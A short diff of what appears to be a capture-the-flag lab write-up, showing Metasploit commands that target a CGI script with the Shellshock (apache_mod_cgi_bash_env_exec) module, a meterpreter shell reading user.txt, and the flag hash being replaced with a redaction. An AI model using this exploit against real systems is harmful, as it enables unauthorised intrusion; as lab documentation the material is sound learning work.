@@ -48,7 +48,7 @@ RHOSTS => 10.10.10.56
 msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/user.sh
 
 meterpreter > cat user.txt 
-2ec24e11320026d1e70ff3e16695b233
+REDACTED FOR WALKTHROUGH
 
 ###########
 # Learned #
